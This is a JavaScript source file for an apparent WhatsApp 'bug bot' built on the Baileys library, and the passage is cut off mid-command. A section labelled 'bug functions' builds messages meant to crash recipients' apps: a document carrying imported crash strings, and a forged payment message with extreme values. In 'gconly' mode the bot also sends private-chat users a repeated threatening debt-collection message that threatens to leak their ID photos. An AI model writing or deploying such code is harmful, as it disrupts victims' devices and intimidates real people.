

const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const canvafy = require('canvafy')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { temporary, temmp } = require('./tempor')

//bug database
const { Yoshtext1 } = require('./69/Yoshtext1')
const { Yoshtext2 } = require('./69/Yoshtext2')
const { Yoshtext3 } = require('./69/Yoshtext3')
const { Yoshtext4 } = require('./69/Yoshtext4')
const { Yoshtext5 } = require('./69/Yoshtext5')
const { Yoshtext6 } = require('./69/Yoshtext6')
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteYosh = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerYosh = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageYosh = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoYosh = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocYosh = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipYosh = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkYosh = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var Yoshytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var Yoshytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var Yoshytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var Yoshytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var Yoshytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var Yoshytimewisher = `Good Morning 🌄`
 } 
module.exports = Yosh = async (Yosh, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') && m.message.buttonsResponseMessage.selectedButtonId ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') && m.message.listResponseMessage.singleSelectReply.selectedRowId ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') && JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await Yosh.decodeJid(Yosh.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await Yosh.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(Yosh, m, premium);

        
        const YoshStickOwner = () => {
            let YoshStikRep = fs.readFileSync('./YoshMedia/sticker/sataruz.webp')
            Yosh.sendMessage(from, { sticker: YoshStikRep }, { quoted: m })
            }
//group chat msg by Yosh
async function appenTextMessage(text, chatUpdate) {
    let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
        userJid: client.user.id,
        quoted: m.quoted && m.quoted.fakeObj
    })
    messages.key.fromMe = areJidsSameUser(m.sender, client.user.id)
    messages.key.id = m.key.id
    messages.pushName = m.pushName
    if (m.isGroup) messages.participant = m.sender
    let msg = {
        ...chatUpdate,
        messages: [proto.WebMessageInfo.fromObject(messages)],
        type: 'append'
    }
    client.ev.emit('messages.upsert', msg)
}
const replygcYosh = (teks) => {
Yosh.sendMessage(m.chat,
{ text: teks,
contextInfo:{
contextInfo: { 
    forwardingScore: 99999999, 
    isForwarded: true, 
    mentionedJid: [sender],
    businessMessageForwardInfo: { 
        businessOwnerJid:'62815540932401@s.whatsapp.net'
    },
    forwardedNewsletterMessageInfo: {
        newsletterJid: '120363192485906802@newsletter',
        serverMessageId: 103,
        newsletterName: "🎉 Allo Yoshhh"
    },
        externalAdReply: {
            title: `ALLO KAK!!!`,
            body: `Singkat aja Lvy Ratu 😝`,
thumbnail: fs.readFileSync(`./YoshMedia/thumb.jpg`),
sourceUrl: `${link}`}}}},
{ quoted: m})
}

//bug functions
const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const Yoshimun = (texto) => {
Yosh.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgYosh = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Yosh's ur father`
}}
}
async function YoshyCrashy(dgYosh,chat) {
Yosh.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgYosh}.${Yoshtext1}` ,
caption: `${dgYosh + Yoshtext1}`,
}, {quoted: subscribe_dgYosh })
}
//end bug functions

async function loading () {
var Yoshlod = [
    "⠋ 10%...",
    "⠙ 20%...",
    "⠹ 30%...",
    "⠸ 40%...",
    "⠼ 50%...",
    "⠴ 60%...",
    "⠦ 70%...",
    "⠧ 80%...",
    "⠇ 90%...",
    "⠏ 100%...",
"Proses Selesai 🦄..."
]
let { key } = await Yosh.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < Yoshlod.length; i++) {
await Yosh.sendMessage(from, {text: Yoshlod[i], edit: key });
}
}
async function loading2 () {
var Yoshlodd = [
    "⠋ 10%...",
    "⠙ 20%...",
    "⠹ 30%...",
    "⠸ 40%...",
    "⠼ 50%...",
    "⠴ 60%...",
    "⠦ 70%...",
    "⠧ 80%...",
    "⠇ 90%...",
    "⠏ 100%...",
"Proses Selesai 🦄..."
]
let { key } = await Yosh.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < Yoshlodd.length; i++) {
await Yosh.sendMessage(from, {text: Yoshlodd[i], edit: key });
}
}

        if (!Yosh.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            Yosh.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        Yosh.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        Yosh.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        Yosh.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let Yoshrecordin = ['recording','composing']
        let Yoshrecordinfinal = Yoshrecordin[Math.floor(Math.random() * Yoshrecordin.length)]
        Yosh.sendPresenceUpdate(Yoshrecordinfinal, from)

        }
        
        if (autobio) {
            Yosh.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return Yosh.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await Yosh.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Yosh.getName(i)}\nFN:${await Yosh.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaYosh of VoiceNoteYosh) {
if (budy === BhosdikaYosh) {
let audiobuffy = fs.readFileSync(`./YoshMedia/audio/${BhosdikaYosh}.mp3`)
Yosh.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaYosh of StickerYosh){
if (budy === BhosdikaYosh){
let stickerbuffy = fs.readFileSync(`./YoshMedia/sticker/${BhosdikaYosh}.webp`)
Yosh.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaYosh of ImageYosh){
if (budy === BhosdikaYosh){
let imagebuffy = fs.readFileSync(`./YoshMedia/image/${BhosdikaYosh}.jpg`)
Yosh.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaYosh of VideoYosh){
if (budy === BhosdikaYosh){
let videobuffy = fs.readFileSync(`./YoshMedia/video/${BhosdikaYosh}.mp4`)
Yosh.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
Yosh.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaYosh of ApkYosh) {
if (budy === BhosdikaYosh) {
let buffer = fs.readFileSync(`./YoshMedia/apk/${BhosdikaYosh}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
Yosh.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaYosh of ZipYosh) {
if (budy === BhosdikaYosh) {
let buffer = fs.readFileSync(`./YoshMedia/zip/${BhosdikaYosh}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaYosh of DocYosh) {
if (budy === BhosdikaYosh) {
let buffer = fs.readFileSync(`./YoshMedia/doc/${BhosdikaYosh}.pdf`)
senddocu(buffer)
}
}
 


        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcYosh(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                Yosh.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        
        /* Menjalankan Gconly */
        const gcPath = './database/gconly.json';

fs.readFile(gcPath, 'utf8', (err, data) => {
  if (err) {
    console.error('Error reading file:', err);
    return;
  }

  let gcData = JSON.parse(data);

  if (gcData.gconly === true && !m.isGroup && !isCreator) {
  
      const gcBug = {
        "key": { 
          "fromMe": false,
          "participant": '0@s.whatsapp.net',
          "remoteJid": 'status@broadcast' 
        },
        message: {
          "listResponseMessage": {
            title: '🔴MALAIKAT PINJOL🟢'
          }
        }
      };
      for (let i = 0; i < 5; i++) {
      Yosh.sendMessage(m.chat, { text: '`HALLO BOS`\n\nGIMANA HUTANG NYA BOS GA DI BAYAR” kan?\n*Ingat Boss Saya bisa SEBARKAN:*\n> Foto KTP\n> Foto selfie Anda\n> beserta kontak darurat yang Anda cantumkan saat awal pengajuan.\n\n_yakin masih mau melalaikan?_ *Tolong kerjasamanya ya.*\n\n*WHATSAPP ANDA AKAN RUSAK JIKA TIDAK SEGERA MELUNASKAN PINJAMAN ANDA*' }, { quoted: gcBug })
      }
      return;
  }
  })
        
        switch (command) {
            case 'addprem':
                if (!isCreator) return replygcYosh(mess.owner)
                if (args.length < 2)
                    return replygcYosh(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replygcYosh("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygcYosh("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replygcYosh(mess.owner)
                if (args.length < 1) return replygcYosh(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replygcYosh("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replygcYosh("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replygcYosh(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                Yosh.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replygcYosh(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcYosh('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcYosh(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcYosh(teks)
                    await sleep(2000)
                    replygcYosh("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcYosh("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replygcYosh(mess.owner)
                    if (!text) return replygcYosh('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcYosh('Link Invalid!')
                    await loading()
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await Yosh.groupAcceptInvite(result).then((res) => replygcYosh(json(res))).catch((err) => replygcYosh(json(err)))
                } catch {
                    replygcYosh('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return replygcYosh(mess.owner)
                replygcYosh('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                Yosh.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replygcYosh(mess.owner)
                replygcYosh(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replygcYosh(mess.owner)
                replygcYosh('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replygcYosh(mess.owner)
                if (args.length < 1) return replygcYosh(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replygcYosh(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replygcYosh(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replygcYosh(mess.owner)
                if (args.length < 1) return replygcYosh(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replygcYosh(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replygcYosh(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replygcYosh(mess.owner)
                if (args.length < 1) return replygcYosh(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replygcYosh(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replygcYosh(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replygcYosh(mess.owner)
                if (args.length < 1) return replygcYosh(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replygcYosh(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replygcYosh(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replygcYosh(mess.owner)
               if (args.length < 1) return replygcYosh('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replygcYosh(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcYosh(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replygcYosh(mess.owner)
                if (args.length < 1) return replygcYosh(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replygcYosh(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replygcYosh(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replygcYosh(mess.owner)
                if (args.length < 1) return replygcYosh(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    Yosh.public = true
                    replygcYosh(mess.done)
                } else if (q == 'self') {
                    Yosh.public = false
                    replygcYosh(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replygcYosh(mess.owner)
                if (!text) return replygcYosh(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcYosh(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replygcYosh(mess.owner)
                if (!quoted) return replygcYosh(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcYosh(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcYosh(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await Yosh.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Yosh.query({
                        tag: 'iq',
                        attrs: {
  to: botNumber,
  type: 'set',
  xmlns: 'w:profile:picture'
                        },
                        content: [{
  tag: 'picture',
  attrs: {
      type: 'image'
  },
  content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcYosh(mess.done)
                } else {
                    var memeg = await Yosh.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcYosh(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replygcYosh(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Yosh.updateBlockStatus(blockw, 'block').then((res) => replygcYosh(json(res))).catch((err) => replygcYosh(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcYosh(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Yosh.updateBlockStatus(blockww, 'unblock').then((res) => replygcYosh(json(res))).catch((err) => replygcYosh(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcYosh(mess.owner)
                if (!m.isGroup) return replygcYosh(mess.group)
                replygcYosh('Bye Everyone 🥺')
                await Yosh.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcYosh(mess.owner)
                if (m.isGroup) return replygcYosh(mess.private)
                await loading()
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await Yosh.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replygcYosh(mess.owner)
                if (!text) return replygcYosh(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await Yosh.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcYosh(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    Yosh.sendMessage(i, {
                        text: a,
                        contextInfo: {
  externalAdReply: {
      showAdAttribution: true,
      title: 'Broadcast By Owner',
      body: `Sent ${i.length} Group`,
      thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
      sourceUrl: global.link,
      mediaType: 1,
      renderLargerThumbnail: true
  }
                        }
                    })
                }
                replygcYosh(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replygcYosh(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("YoshBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replygcYosh(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replygcYosh(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replygcYosh('The message was not sent by a bot!')
                Yosh.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcYosh('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcYosh(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
